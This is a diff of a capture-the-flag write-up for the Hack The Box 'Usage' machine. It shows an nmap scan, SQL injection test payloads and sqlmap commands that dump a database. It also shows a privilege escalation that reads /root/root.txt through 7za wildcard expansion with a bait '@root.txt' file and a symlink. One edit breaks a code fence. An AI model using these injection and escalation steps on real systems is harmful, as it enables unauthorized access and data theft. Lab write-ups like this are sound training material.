@@ -1,10 +1,10 @@
-# Machine Usage from [Hack The Box](https://www.hackthebox.com/)
+# Usage machine from [Hack The Box](https://www.hackthebox.com/)
 
 Target IP: 10.10.11.18
 ## Enumeration and reconnaissance
 
 Using nmap we launch a SYN scan on every port (65535) looking for services and export the results to the file named `open_ports`
-```
+``` bash
 nmap -p- -sS -n -Pn -vvv --min-rate 3000 -oG open_ports 10.10.11.18
 ```
 The target machine only has ports 22 (SSH) and 80 (HTTP) open.
@@ -12,12 +12,12 @@ The target machine only has ports 22 (SSH) and 80 (HTTP) open.
 ## Gaining access to target machine
 
 Before accessing the http service we should add the domain to `/etc/hosts` for the browser to know which IP should use because it's being redirecting to the domain 'usage.htb'
-```
+``` bash
 echo "10.10.11.18   usage.htb" >> /etc/hosts
 ```
 
 The application in `http://10.10.11.18` is very simple, it has a button to recover the password that redirect us to `usage.htb/forget-password`. There we have a box to insert our email (I previously registered using test@test.com) and it's vulnerable to SQL Injections, as you can verify with simple payloads like
-```
+``` bash
 # Payloads to verify the SQLi vulnerability
 test@test.com' OR 1=1-- -
 ' OR 1=1-- -
@@ -28,7 +28,7 @@ Eventhough the application is vulnerable to SQLi we don't have any kind of respo
 ### Exploting SQL Injections
 
 To exploit the blind SQLi I'm gonna use `sqlmap` setting the `--level` to 5.
-```
+``` bash
 sqlmap -r db_request --dbms=mysql --level=5 --dbs --batch
 ```
 `-dbs:` to list all the databases \
@@ -36,16 +36,16 @@ sqlmap -r db_request --dbms=mysql --level=5 --dbs --batch
 `-batch:` to avoid waiting for user input and use the default options instead
 
 Once we discover some databases, we can use the following command to inspect the available tables
-```
+``` bash
 sqlmap -r db_request -D <database> --tables --batch
 ```
 Once we have information about tables, we can use `--columns` to inspect the structure of the table itself.
-```
+``` bash
 sqlmap -r db_request -D <database> -T <table> --columns --batch
-```
+``` bash
 And finally using `--dump` we query the contents of the selected table from the selected database.
 
-```
+``` bash
 sqlmap -r db_request -D <database> -T <table> -C <column> --dump --batch
 ```
 
@@ -98,7 +98,7 @@ The `dash` user doesn't have special access, so first we can proceed with a late
 ![alt text](imgs/image-2.png)
 
 Now the user `xander` has sudo access to use the binary `/usr/bin/user_management`
-```
+``` bash
 sudo -l
 #(ALL : ALL) NOPASSWD: /usr/bin/usage_management
 ```
@@ -122,7 +122,7 @@ Summarazing:
 All in place, we just need a way to make that "*" somehow expands to "@root.txt" for the actual 7za command ends up being `/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- @root.txt [...]`
 To do so we can create a file called '@root.txt' and another one called `root.txt` (we need the 2nd one so the content get's displayed) which would be a symlink pointing to the actual `/root/root.txt`
 
-```
+``` bash
 # from /var/www/html
 # create the bait file
 touch "@root.txt"
@@ -131,7 +131,7 @@ ln -s -r /root/root.txt root.txt
 ```
 
 Once everything is in place, let's hack!
-```
+``` bash
 sudo /usr/bin/user_management
 # input option 1 when prompted
 # the content of root.txt should be display as plain text!
